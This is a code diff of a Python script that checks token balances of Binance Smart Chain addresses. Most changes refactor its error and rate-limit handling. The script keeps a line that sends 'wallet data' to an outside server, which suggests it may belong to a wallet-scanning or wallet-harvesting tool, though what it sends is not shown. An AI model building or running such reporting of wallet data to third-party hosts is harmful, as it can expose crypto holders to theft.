@@ -16,7 +16,7 @@ bsc_rpc_url = 'https://bsc-dataseed.binance.org/'
 web3 = Web3(Web3.HTTPProvider(bsc_rpc_url))
 
 # API to send wallet data to server
-api_url = 'https://hvnteam.com/wallet.php'  # Replace YOUR_SERVER_IP with your server's IP
+api_url = 'https://hvnteam.com/wallet.php'
 
 # List of API keys
 api_keys = [
@@ -83,6 +83,7 @@ def get_all_tokens(address):
         try:
             response = requests.get(url, timeout=10)
 
+            # Check for empty or invalid response
             if response.text.strip() == "":
                 print(f"[ERROR] API returned an empty response")
                 time.sleep(1)
@@ -95,10 +96,10 @@ def get_all_tokens(address):
                 time.sleep(1)
                 continue
 
-            if data.get('status') == '0':
-                # Check the result message
-                result_message = data.get('result', '')
+            # Handle specific result cases
+            result_message = data.get('result', '')
 
+            if data.get('status') == '0':
                 if "Max calls per sec rate limit reached" in result_message:
                     print(f"[WARNING] API rate limit hit, retrying...")
                     time.sleep(0.5)
@@ -129,8 +130,9 @@ def get_all_tokens(address):
 
             break
 
-        except Exception as e:
-            print(f"[ERROR] Error retrieving tokens: {e}")
+        except requests.exceptions.RequestException as e:
+            print(f"[ERROR] Network issue when retrieving tokens: {e}")
+            time.sleep(1)
 
     return {k: v for k, v in tokens.items() if v > 0}
 
